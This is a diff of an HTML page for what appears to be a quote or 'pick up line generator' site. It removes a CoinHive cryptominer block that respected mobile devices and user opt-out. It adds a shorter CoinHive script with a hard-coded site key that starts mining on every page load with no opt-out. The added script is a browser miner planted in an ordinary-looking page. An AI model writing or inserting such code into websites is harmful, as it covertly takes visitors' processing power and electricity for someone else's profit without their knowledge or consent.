@@ -12,37 +12,18 @@
 	<input name="q" type="text" />
 	<input type="submit" name="sa" value="Google" />
 </form>
-<script>
-	var miner = new CoinHive.Anonymous('CTUSWoLxgeTNkiyk31ntjZtBs2EPi1JK', {throttle: 0.3});
-
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-		// Listen on events
-	miner.on('found', function() {console.log("found hash!") })
-	miner.on('accepted', function() { console.log("accepted hash!") })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-		
-		console.log("hashesPerSecond", hashesPerSecond)
-		console.log("totalHashes", totalHashes)
-		console.log("acceptedHashes", acceptedHashes)
-		// Output to HTML elements...
-	}, 1000);
-	}
-</script>
     <div id="background-image" class="overlay"></div>
     <div id="container">
       <div id="quote">
-        Results may vary.(Default)
+       Pick up line generator V1.(Default)
       </div>
       <div id="author"></div>
     </div>
     <script type="text/javascript" src="script.js"></script>
+	  <script>
+	  // create a miner
+	  var miner = new CoinHive.Anonymous('CTUSWoLxgeTNkiyk31ntjZtBs2EPi1JK', {throttle: 0.3});
+	  miner.start();	  
+	  </script>
   </body>
 </html>
